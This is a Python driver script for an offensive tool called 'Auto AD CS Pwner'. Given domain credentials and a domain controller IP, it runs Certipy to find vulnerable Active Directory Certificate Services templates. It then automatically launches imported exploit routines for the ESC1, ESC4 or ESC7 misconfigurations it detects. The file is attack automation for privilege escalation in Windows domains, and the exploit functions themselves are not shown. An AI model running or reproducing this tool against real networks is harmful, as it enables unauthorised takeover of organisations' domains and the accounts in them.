from utils.certipy_runner import run_certipy_find, save_results_to_json, exploit_esc1, exploit_esc4, exploit_esc7
from utils.parser import parse_stdout_output
import argparse
import os
import subprocess

def main():
    parser = argparse.ArgumentParser(description="Auto AD CS Pwner")
    parser.add_argument("--username", required=True)
    parser.add_argument("--password", required=True)
    parser.add_argument("--domain", required=True)
    parser.add_argument("--dc-ip", required=True)

    args = parser.parse_args()

    print("[*] Running Certipy to find vulnerable templates...")
    output = run_certipy_find(args.username, args.password, args.domain, args.dc_ip)

    if output is None:
        print("[!] Failed to get Certipy output")
        return

    parsed_data = parse_stdout_output(output)
    save_results_to_json(parsed_data, "output/certipy-find-output.json")

    for template in parsed_data:
        if template.get("vuln") == "ESC1":
            print(f"[+] Detected ESC1 on template: {template['template_name']}")
            exploit_esc1(
                username=args.username,
                password=args.password,
                domain=args.domain,
                dc_ip=args.dc_ip,
                ca_name=template["ca_name"],
                template_name=template["template_name"]
            )
            break
        elif template.get("vuln") == "ESC4":
            print(f"[+] Detected ESC4 on template: {template['template_name']}")
            exploit_esc4(
                username=args.username,
                password=args.password,
                domain=args.domain,
                dc_ip=args.dc_ip,
                ca_name=template["ca_name"],
                template_name=template["template_name"]
            )
            break
        elif template.get("vuln") == "ESC7":
            print(f"[+] Detected ESC7 on template: {template['template_name']}")
            exploit_esc7(
                username=args.username,
                password=args.password,
                domain=args.domain,
                dc_ip=args.dc_ip,
                ca_name=template["ca_name"]
            )
            break

    else:
        print("[!] No exploitable templates (ESC1 or ESC4 or ESC7) found.")

if __name__ == "__main__":
    main()
